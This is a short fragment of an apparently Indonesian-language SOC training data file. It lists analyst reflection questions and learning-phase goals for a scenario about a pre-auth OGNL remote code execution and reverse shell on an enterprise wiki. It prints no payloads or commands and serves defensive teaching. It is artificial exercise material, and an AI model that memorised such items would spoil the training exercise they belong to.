      "Mengapa korelasi antara request web dan koneksi outbound membuktikan True Positive?",
      "Evidence mana yang membuktikan server mengeksekusi shell biner sistem (/bin/sh)?",
      "Apakah ada kemungkinan false positive jika traffic berasal dari IP publik asing?",
      "Bagaimana cara memvalidasi keputusanmu dengan memeriksa process tree di server?",
      "Mitigasi apa yang mencegah reverse shell bekerja meskipun ada celah RCE?"
    ],
    lapsMapping: {
      understand: "Menganalisis serangan pre-auth remote code execution pada enterprise wiki.",
      plan: "Merumuskan signature WAF untuk memblokir ekspresi OGNL di URL path.",
      execute: "Mendekode URL encoded payload Tomcat.",
      review: "Mengevaluasi pentingnya patch CISA KEV (Known Exploited Vulnerabilities)."
    }
  }
];
